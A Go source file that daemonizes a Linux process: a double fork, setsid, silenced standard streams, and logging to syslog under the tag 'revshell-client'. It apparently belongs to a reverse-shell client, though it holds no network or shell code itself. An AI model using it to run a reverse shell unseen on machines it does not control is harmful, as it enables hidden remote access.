//go:build linux

package main

import (
	"io"
	"log"
	"log/syslog"
	"os"
	"syscall"
)

const daemonSupported = true

func daemonize() error {
	pid, err := fork()
	if err != nil {
		return err
	}
	if pid > 0 {
		os.Exit(0)
	}

	if _, err := syscall.Setsid(); err != nil {
		return err
	}

	pid, err = fork()
	if err != nil {
		return err
	}
	if pid > 0 {
		os.Exit(0)
	}

	if err := os.Chdir("/"); err != nil {
		return err
	}
	syscall.Umask(0)

	nullFile, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer nullFile.Close()

	if err := syscall.Dup2(int(nullFile.Fd()), int(os.Stdin.Fd())); err != nil {
		return err
	}
	if err := syscall.Dup2(int(nullFile.Fd()), int(os.Stdout.Fd())); err != nil {
		return err
	}
	if err := syscall.Dup2(int(nullFile.Fd()), int(os.Stderr.Fd())); err != nil {
		return err
	}

	writer, err := syslog.New(syslog.LOG_DAEMON|syslog.LOG_INFO, "revshell-client")
	if err != nil {
		log.SetOutput(io.Discard)
	} else {
		log.SetOutput(writer)
	}
	log.SetFlags(log.LstdFlags)

	return nil
}

func fork() (int, error) {
	r1, _, errno := syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)
	if errno != 0 {
		return 0, errno
	}
	return int(r1), nil
}
